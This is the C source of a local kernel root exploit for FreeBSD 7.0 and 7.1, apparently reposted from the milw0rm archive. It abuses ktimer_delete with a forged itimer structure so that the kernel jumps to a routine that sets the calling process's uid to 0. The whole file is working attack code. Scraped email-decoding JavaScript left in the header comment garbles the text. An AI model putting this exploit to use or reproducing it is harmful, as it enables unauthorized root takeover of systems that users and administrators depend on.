/* bsd-ktimer.c
 *
 * Copyright (c) 2008 by <christer@signedness.org<SCRIPT type=text/javascript>
/* <![CDATA[ */
(function(){try{var s,a,i,j,r,c,l=document.getElementById("__cf_email__");a=l.className;if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
/* ]]> */
</SCRIPT>>
 *                       <mu-b@digit-labs.org<SCRIPT type=text/javascript>
/* <![CDATA[ */
(function(){try{var s,a,i,j,r,c,l=document.getElementById("__cf_email__");a=l.className;if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
/* ]]> */
</SCRIPT>>
 *
 * FreeBSD >= 7.0 local kernel root exploit
 * by christer/mu-b - Mon 2 June 2008
 *
 * - Tested on: FreeBSD 7.0
 *              FreeBSD 7.1
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.bsdcitizen.org/ -- BSDCITIZEN 2008!@$!
 */

#define _KERNEL

#include <stdio.h>
#include <stdlib.h>

#include <sys/types.h>
#include <sys/mman.h>
#include <sys/queue.h>
#include <sys/signalvar.h>
#include <sys/_lock.h>
#include <sys/_mutex.h>
#include <altq/altq.h>
#include <sys/timers.h>

#include <string.h>
#include <unistd.h>
#include <sys/param.h>
#include <sys/linker.h>
#include <sys/proc.h>

#define ITPSIZE     0x08000000
#define LOOKUP      0xD0000000

/* some prototypes to prevent compiler bitching */
int ktimer_create(int, int, int *);
int ktimer_delete(int);
int kldsym(int, int, void *);

static void
give_me_root()
{
	struct thread *thread;
	asm("movl %%fs:0,%0": "=r"(thread));
	thread->td_proc->p_ucred->cr_uid=0;
}

int
main (int argc, char **argv)
{
  struct itimer **itp_page, *it_page;
  struct kld_sym_lookup ksym;
  void *zpage[16];
  int i, r;

  printf ("FreeBSD local kernel root exploit\n"
          "by: christer/mu-b\n"
          "http://www.bsdcitizen.org/ -- BSDCITIZEN 2008!@$!\n\n");

  itp_page = mmap (0, ITPSIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANON, -1, 0);
  if (itp_page < 0)
    {
      fprintf (stderr, "%s: failed to mmap %d-bytes\n",
                       argv[0], ITPSIZE);
      exit (EXIT_FAILURE);
    }

  printf ("* allocated pointer page: 0x%08X -> 0x%08X [%d-bytes]\n",
          (int) itp_page, (int) itp_page + ITPSIZE, ITPSIZE);

  it_page = mmap (itp_page + ITPSIZE, sizeof (struct itimer),
                  PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANON, -1, 0);
  if (it_page < 0)
    {
      fprintf (stderr, "%s: failed to mmap %d-bytes\n",
                       argv[0], sizeof (struct itimer));
      exit (EXIT_FAILURE);
    }

  printf ("* allocated itimer struct: 0x%08X -> 0x%08X [%d-bytes]\n",
          (int) it_page, (int) it_page + sizeof (struct itimer), sizeof (struct itimer));

  printf ("* filling pointer page... ");
  fflush (stdout);

  for (i = 0; i < ITPSIZE / sizeof (struct itimer *); i++)
    itp_page[i] = it_page;
  printf ("done\n");

  ksym.version = sizeof(ksym);
  ksym.symname = "posix_clocks";

  if (kldsym(0,KLDSYM_LOOKUP,&ksym) < 0)
    {
      fprintf (stderr, "%s: failed to lookup posix_clocks\n", argv[0]);
      exit (EXIT_FAILURE);
    }

  printf("* found posix_clocks @ [0x%x]\n",(unsigned )ksym.symvalue);

  for (i = 0; i < 16; i++)
    zpage[i] = (void *) give_me_root;

  memset (it_page,  0, sizeof (struct itimer));
  /* DIRTY REPLACE WITH EXACT STRUCTURE MEMBER */
  for (i = 0; i < 10; i++)
    ((unsigned int *) it_page)[i] = 4;

  it_page->it_flags = 0x00;
  it_page->it_usecount = 0;
  it_page->it_clockid = ((int) &zpage[8] - ksym.symvalue) / 20;

  printf ("* it_page->it_clockid: 0x%08X [access @0x%08X]\n",
           it_page->it_clockid,(unsigned )&zpage[8]);
  printf ("* ktimer_delete (0x%08X)\n", LOOKUP);

  sleep (2);
  ktimer_create (0, 0, &i);
  r = ktimer_delete (LOOKUP);

  printf ("* ktimer_delete: %d %d\n", r, it_page->it_flags);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2009-03-23]
